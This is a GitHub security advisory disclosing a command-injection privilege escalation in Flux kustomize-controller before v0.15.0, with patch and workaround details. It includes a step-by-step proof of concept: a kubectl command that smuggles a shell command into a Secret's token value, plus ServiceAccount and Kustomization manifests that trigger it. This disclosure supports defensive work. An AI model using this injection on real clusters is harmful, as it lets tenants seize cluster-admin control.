# Privilege escalation to cluster admin on multi-tenant environments

High

[stefanprodan](/stefanprodan)
published
GHSA-35rf-v2jv-gfg7
Nov 11, 2021

## Package

gomod

github.com/fluxcd/kustomize-controller
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

< 0.15.0

## Patched versions

v0.15.0

## Description

Users that can create Kubernetes Secrets, Service Accounts and Flux Kustomization objects, could execute commands inside the kustomize-controller container by embedding a shell script in a Kubernetes Secret. This can be used to run `kubectl` commands under the Service Account of kustomize-controller, thus allowing an authenticated Kubernetes user to gain cluster admin privileges.

### Impact

Multitenant environments where non-admin users have permissions to create Flux Kustomization objects are affected by this issue.

### Exploit

To exploit the command injection, first we create a secret with a shell command:

```
kubectl create secret generic exploit-token --from-literal=token=" || kubectl api-versions"
```

Then we create a Service Account that refers to the above Secret:

```
apiVersion: v1
kind: ServiceAccount
metadata:
  name: exploit
  namespace: default
automountServiceAccountToken: false
secrets:
- name: exploit-token
```

And finally a Kustomization that runs under the above Service Account:

```
apiVersion: kustomize.toolkit.fluxcd.io/v1beta1
kind: Kustomization
metadata:
  name: exploit
  namespace: default
spec:
  interval: 5m
  path: "./deploy/"
  sourceRef:
    kind: GitRepository
    name: app
  serviceAccountName: exploit
```

When kustomize-controller reconciles the above Kustomization, it will execute the shell command from the secret.

### Patches

This vulnerability was fixed in kustomize-controller v0.15.0 (included in flux2 v0.18.0) released on 2021-10-08. Starting with v0.15, the kustomize-controller no longer executes shell commands on the container OS and the `kubectl` binary has been removed from the container image.

### Workarounds

To prevent the creation of Kubernetes Service Accounts with `secrets` in namespaces owned by tenants, a Kubernetes validation webhook such as Gatekeeper OPA or Kyverno can be used.

```
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-sa
spec:
  validationFailureAction: enforce
  background: false
  rules:
    - name: validate-sa
      match:
        resources:
          kinds:
            - ServiceAccount
          namespaces:
            - tenant1
            - tenant2
        subjects:
          - kind: User
            name: some@tenant1.com
          - kind: User
            name: some@tenant2.com
          - kind: ServiceAccount
            name: kustomize-controller
            namespace: flux-system
          - kind: ServiceAccount
            name: helm-controller
            namespace: flux-system
      validate:
        message: "Invalid service account"
        pattern:
          X(secrets): "*?"
```
